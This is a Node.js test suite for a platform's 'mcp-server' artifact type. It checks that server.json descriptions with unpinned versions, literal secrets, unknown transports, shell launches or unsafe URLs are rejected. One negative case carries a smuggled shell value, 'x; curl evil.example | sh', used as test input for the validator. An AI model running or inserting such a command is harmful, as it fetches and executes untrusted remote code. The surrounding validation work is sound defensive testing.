// The `mcp-server` artifact type: MCP.md + server.json (field names follow the official MCP registry schema
// of 2025-12-11), checks for version pinning, secrets, transport, shell and URL; kept out of the marketplace;
// installation into agents comes later. Negative cases are mutations of a good fixture. Requires `npm run build`.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { join } from "node:path";
import { startServer, api, login, createUser, loadDir, toB64, ROOT, ADMIN_PASSWORD } from "./lib/client.mjs";

const FIX = join(ROOT, "tests", "fixtures", "mcp-servers");
const files = (name, mutate = (f) => f) =>
  toB64(mutate(loadDir(join(FIX, name))).map((f) => ({ path: `${name}/${f.path}`, content: f.content })));
const withServer = (json) => (fs) =>
  fs.map((f) => (f.path === "server.json" ? { path: f.path, content: Buffer.from(typeof json === "string" ? json : JSON.stringify(json)) } : f));
const without = (path) => (fs) => fs.filter((f) => f.path !== path);
const HEX = "0123456789abcdef".repeat(4);

const pkg = (o = {}) => ({
  registryType: "npm",
  identifier: "@modelcontextprotocol/server-github",
  version: "2025.4.8",
  runtimeHint: "npx",
  transport: { type: "stdio" },
  environmentVariables: [{ name: "GITHUB_PERSONAL_ACCESS_TOKEN", isRequired: true, isSecret: true }],
  ...o,
});
const remote = (o = {}) => ({ type: "streamable-http", url: "https://mcp.example.com/mcp", ...o });

let srv;
let base;
let admin;
let alice;

before(async () => {
  srv = await startServer({}, { prefix: "skillforge-mcp-type-" });
  assert.ok(srv.up, `server did not start: ${srv.stderr}`);
  base = srv.base;
  admin = await login(base, "admin", ADMIN_PASSWORD);
  await createUser(base, admin.cookie, { username: "alice", password: "alice-pw-1", role: "contributor" });
  alice = await login(base, "alice", "alice-pw-1");
  // mcp-policy: remote servers are published only from allowed URLs; here the type rules are checked, not the policy.
  const p = await api(base, "PUT", "/api/v1/admin/mcp-policy", { remote_origins: ["https://mcp.sentry.dev", "https://mcp.example.com", "https://*.mcp.example.com"] }, { cookie: admin.cookie });
  assert.equal(p.status, 200, JSON.stringify(p.data));
});

after(async () => {
  if (srv?.up) await srv.stop();
});

const validate = (body) => api(base, "POST", "/api/v1/artifacts/validate", body, { cookie: admin.cookie });
const codes = (r) => r.data.errors.map((e) => e.code);

test("the mcp-server type is in the type table", async () => {
  const r = await api(base, "GET", "/api/v1/artifact-types");
  const t = r.data.items.find((x) => x.id === "mcp-server");
  assert.ok(t, JSON.stringify(r.data.items.map((x) => x.id)));
  assert.equal(t.label, "MCP server");
  // rule-artifacts added `rule` after it
  assert.equal(r.data.items.at(-2).id, "mcp-server");
});

test("good descriptions: npm, remote with a template header, image by digest — no errors", async () => {
  for (const name of ["github-tools", "sentry-remote", "acme-image"]) {
    const r = await validate({ files: files(name) });
    assert.equal(r.status, 200);
    assert.equal(r.data.detected_type, "mcp-server", name);
    assert.deepEqual(r.data.errors, [], `${name}: ${JSON.stringify(r.data.errors)}`);
    assert.equal(r.data.artifact.name, name);
  }
});

test("negative cases: each with its own code, messages without values", async () => {
  const cases = [
    ["no server.json", without("server.json"), "E_MCP_JSON_INVALID"],
    ["not JSON", withServer("{ nope"), "E_MCP_JSON_INVALID"],
    ["no packages and no URLs", withServer({ packages: [], remotes: [] }), "E_MCP_JSON_INVALID"],
    ["npm without a version", withServer({ packages: [pkg({ version: undefined })] }), "E_MCP_UNPINNED"],
    ["npm range", withServer({ packages: [pkg({ version: "^2025.4.8" })] }), "E_MCP_UNPINNED"],
    ["npm latest", withServer({ packages: [pkg({ version: "latest" })] }), "E_MCP_UNPINNED"],
    ["pypi range", withServer({ packages: [pkg({ registryType: "pypi", identifier: "mcp-server-git", version: ">=0.6", runtimeHint: "uvx" })] }), "E_MCP_UNPINNED"],
    ["image without a digest", withServer({ packages: [pkg({ registryType: "oci", identifier: "ghcr.io/acme/kb-mcp:1.0", version: undefined, runtimeHint: "docker" })] }), "E_MCP_UNPINNED"],
    ["secret as a literal with isSecret", withServer({ packages: [pkg({ environmentVariables: [{ name: "GITHUB_PERSONAL_ACCESS_TOKEN", isSecret: true, value: "FAKE-SECRET-isSecret-0001" }] })] }), "E_MCP_SECRET_LITERAL"],
    ["secret as a literal by name", withServer({ packages: [pkg({ environmentVariables: [{ name: "OPENAI_API_KEY", value: "FAKE-SECRET-name-0002" }] })] }), "E_MCP_SECRET_LITERAL"],
    ["secret as a literal in default", withServer({ packages: [pkg({ environmentVariables: [{ name: "TOKEN", isSecret: true, default: "FAKE-SECRET-default-0003" }] })] }), "E_MCP_SECRET_LITERAL"],
    ["header with a literal token", withServer({ remotes: [remote({ headers: [{ name: "Authorization", value: "Bearer FAKE-SECRET-header-0004" }] })] }), "E_MCP_SECRET_LITERAL"],
    ["unknown package type", withServer({ packages: [pkg({ registryType: "nuget" })] }), "E_MCP_TRANSPORT_UNKNOWN"],
    ["unknown package transport", withServer({ packages: [pkg({ transport: { type: "websocket" } })] }), "E_MCP_TRANSPORT_UNKNOWN"],
    ["remote stdio", withServer({ remotes: [remote({ type: "stdio" })] }), "E_MCP_TRANSPORT_UNKNOWN"],
    ["launch through a shell", withServer({ packages: [pkg({ runtimeHint: "bash" })] }), "E_MCP_SHELL"],
    ["shell substitution in an argument", withServer({ packages: [pkg({ packageArguments: [{ type: "positional", value: "x; curl evil.example | sh" }] })] }), "E_MCP_SHELL"],
    ["http URL", withServer({ remotes: [remote({ url: "http://mcp.example.com/mcp" })] }), "E_MCP_URL_INVALID"],
    ["password in the URL", withServer({ remotes: [remote({ url: "https://u:FAKE-SECRET-userinfo-0005@mcp.example.com/mcp" })] }), "E_MCP_URL_INVALID"],
    ["key in the URL query", withServer({ remotes: [remote({ url: "https://mcp.example.com/mcp?api_key=FAKE-SECRET-query-0006" })] }), "E_MCP_URL_INVALID"],
    ["localhost", withServer({ remotes: [remote({ url: "https://localhost:8443/mcp" })] }), "E_MCP_URL_INVALID"],
  ];
  for (const [label, mutate, code] of cases) {
    const r = await validate({ type: "mcp-server", files: files("github-tools", mutate) });
    assert.equal(r.status, 200, label);
    assert.ok(codes(r).includes(code), `${label}: expected ${code}, got ${JSON.stringify(r.data.errors)}`);
    assert.ok(!JSON.stringify(r.data.errors).includes("FAKE-SECRET-"), `${label}: value in the message`);
  }
});

test("not errors: a template reference in a header, a non-secret literal, a host template", async () => {
  const ok = withServer({
    packages: [pkg({ environmentVariables: [{ name: "GITHUB_HOST", value: "github.com" }, { name: "GITHUB_PERSONAL_ACCESS_TOKEN", isSecret: true }] })],
    remotes: [
      remote({
        url: "https://{tenant}.mcp.example.com/mcp",
        variables: { tenant: { description: "Tenant id", isRequired: true } },
        headers: [{ name: "Authorization", isSecret: true, value: "Bearer {token}", variables: { token: { isSecret: true, isRequired: true } } }],
      }),
    ],
  });
  const r = await validate({ type: "mcp-server", files: files("github-tools", ok) });
  assert.deepEqual(r.data.errors, [], JSON.stringify(r.data.errors));
});

test("publish: candidate; outside the marketplace; installation into agents is not supported yet", async () => {
  for (const name of ["github-tools", "sentry-remote", "acme-image"]) {
    const r = await api(base, "POST", "/api/v1/artifacts", { type: "mcp-server", files: files(name) }, { cookie: alice.cookie });
    assert.equal(r.status, 201, `${name}: ${JSON.stringify(r.data)}`);
  }
  const detail = await api(base, "GET", "/api/v1/artifacts/mcp-server/github-tools");
  assert.equal(detail.status, 200);
  assert.equal(detail.data.artifact.status, "candidate");
  assert.ok(detail.data.install.runtimes.length > 0);
  for (const rt of detail.data.install.runtimes) {
    assert.equal(rt.supported, false, rt.runtime);
    assert.match(rt.reason, /MCP server/);
  }
  // Review: a contributor does not promote to active; reviewer/admin does. Only an active artifact could reach the marketplace.
  const self = await api(base, "POST", "/api/v1/artifacts/mcp-server/github-tools/transitions", { to: "active", reason: "self" }, { cookie: alice.cookie });
  assert.equal(self.status, 403, JSON.stringify(self.data));
  const t = await api(base, "POST", "/api/v1/artifacts/mcp-server/github-tools/transitions", { to: "active", reason: "mcp test" }, { cookie: admin.cookie });
  assert.equal(t.status, 200, JSON.stringify(t.data));
  const market = await api(base, "GET", "/marketplace.json");
  assert.ok(!JSON.stringify(market.data).includes("github-tools"), "mcp-server reached the marketplace");
  const tar = await api(base, "GET", `/api/v1/plugins/mcp-server/github-tools/2025.4.8.tar.gz`);
  assert.equal(tar.status, 404);
});
